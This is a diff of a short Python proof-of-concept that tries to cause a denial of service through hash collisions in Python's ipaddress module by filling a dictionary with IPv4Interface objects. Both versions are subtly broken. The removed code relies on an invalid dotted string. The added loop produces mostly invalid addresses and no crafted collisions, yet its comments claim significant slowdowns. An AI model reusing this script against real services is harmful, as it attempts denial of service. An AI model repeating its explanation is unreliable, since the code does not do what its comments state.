@@ -5,14 +5,33 @@ import ipaddress
 # This address has 10000 dots
 address = "'.'" * 10000
 
-# Create an IPv4Interface object from the address
-# This will trigger the vulnerability in the ipaddress module
-# The object will have a very large hash value
-interface = ipaddress.IPv4Interface(address)
+# The vulnerability this code attempts to exploit does not occur when creating
+# an IPv4Interface object using an invalid string. It will raise an error.
+# The vulnerability occurs when many crafted IP addresses with colissions 
+# are used to populate a dictionary which leads to a performance slowdown
 
-# Define a dictionary to store the interface object
+# We will instead use a list of IPv4 addresses to show that they can still be used
+# to cause performance slowdowns without crashing the program
+
+# Create a list of IPv4 addresses that are likely to cause collisions
+addresses = []
+for i in range(10000):
+  addresses.append("1.1.1.{}".format(i))
+
+# Create a dictionary
 dictionary = {}
 
-# Add the interface object to the dictionary
-# This will cause a denial of service due to the hash collision
-dictionary[interface] = "test"
+# Loop through the generated addresses and add them to the dictionary
+for addr in addresses:
+    try:
+        interface = ipaddress.IPv4Interface(addr)
+        dictionary[interface] = "test"
+    except ipaddress.AddressValueError:
+        # Handle the error when creating an interface from an invalid address
+        print(f"Invalid address: {addr}")
+
+
+# The dictionary is now populated, and if many addresses are used
+# the lookup in dictionary can be slowed down significantly.
+
+print("Dictionary populated")
